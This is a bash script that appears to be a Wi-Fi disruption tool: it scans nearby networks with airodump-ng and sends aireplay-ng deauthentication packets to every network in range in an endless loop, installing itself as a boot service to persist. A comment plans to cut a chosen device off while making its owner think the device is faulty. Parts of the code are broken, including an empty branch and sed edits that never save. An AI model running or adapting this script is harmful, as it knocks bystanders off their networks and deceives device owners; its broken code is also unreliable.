#!/bin/bash

#TODO: Prevent a device from connecting to networks (aka make the user believe the device is problematic)
# aireplay-ng -0 $n -a $your_AP -c $mac $interface --ignore-negative-one

#TODO: Add a feature to target the closest WiFi in range. We'll play with PWR values in the scan file.

flag=""

main()
{
  interface="wlan0"
  start_mon
  #check if script is setup, otherwise prompt
  if [[ $1 == "--haki" ]]; then
    haki
  elif [[ $1 == "--closest" ]]; then
    #attack_closest
  else
    menu
  fi
}

clean_up_junk()
{
	if [ -d "/var/tmp/perish_dump" ]
	then
		rm -rf /var/tmp/perish_dump
	fi
}

create_working_folder()
{
	if [ ! -d "/var/tmp/perish_dump" ]
	then
		mkdir /var/tmp/perish_dump
	fi
}

print_menu()
{
	echo
	echo " Setup Menu"
	echo
	echo "   0    Unistall any previous script"
	echo "   1    Attack closest network only"
	echo "   2    Attack everyone in the perimeter"
	echo
	echo -n "	Choose an option : "
}

menu()
{
	clear

	#each time menu is called, clean up previous scans
	clean_up_junk

	#create the working directory, where we save our scan files temporarily
	create_working_folder

	#print the menu and choose your option afterwards
	print_menu

	read option
	clear
	case $option in

    0 )
      update-rc.d -f "$PWD"/$0 remove
      sed '0,/flag=/s//flag=""/' "$PWD"/$0
      ;;

		1 )
      echo
      echo "		[!] Mode is work in progress. Not available.gh"
      sleep 1
      menu

      update-rc.d -f "$PWD"/$0 remove
      sed '0,/flag=/s//flag="--closest"/' "$PWD"/$0
			update-rc.d "$PWD"/$0 defaults
			;;

		2 )
      update-rc.d -f  "$PWD"/$0 remove
      sed '0,/flag=/s//flag="--haki"/' "$PWD"/$0
      update-rc.d "$PWD"/$0 defaults
			;;

		* )
			echo
			echo "		[!] Invalid option, try again"
			sleep 1
			menu
			;;
		esac
}

haki()
{

  #scan for n seconds
	scan 15

	echo "	[i] Continuously attacking these networks... "
	echo

	local i=1

	while read essid
	do
		#get each corresponding channel for every essid found
		channel=$(sed -n "${i}{p;q;}" /var/tmp/perish_dump/channels)

    echo "	[+] Synchronising card to channel: $channel"
    #sync the card to the victim's channel
    iwconfig $interface channel $channel

		echo "	[+] Attacking $essid"
		#send some deauth packets to each wifi network
		 aireplay-ng -0 5 -e $essid $interface --ignore-negative-one > /dev/null 2>&1

		((i++))
	done < /var/tmp/perish_dump/essids

  #loop when you are done
	haki
}

stop_mon()
{
	nexutil -m0
}

start_mon()
{
	nexutil -m2
}

scan()
{
  scan_interval=$1
	timeout -k $scan_interval airodump-ng $interface --output-format kismet --write "/var/tmp/perish_dump/scan_data" > /dev/null 2>&1 &

	awk -F "\"*;\"*" '{print $4}' /var/tmp/perish_dump/scan_data-01.kismet.csv | tail -n 2 > /var/tmp/perish_dump/bssids
	awk -F "\"*;\"*" '{print $3}' /var/tmp/perish_dump/scan_data-01.kismet.csv | tail -n 2 > /var/tmp/perish_dump/essids
	awk -F "\"*;\"*" '{print $6}' /var/tmp/perish_dump/scan_data-01.kismet.csv | tail -n 2 > /var/tmp/perish_dump/channels
}

#Here starts the script and passes the flag arguement to it
main $flag
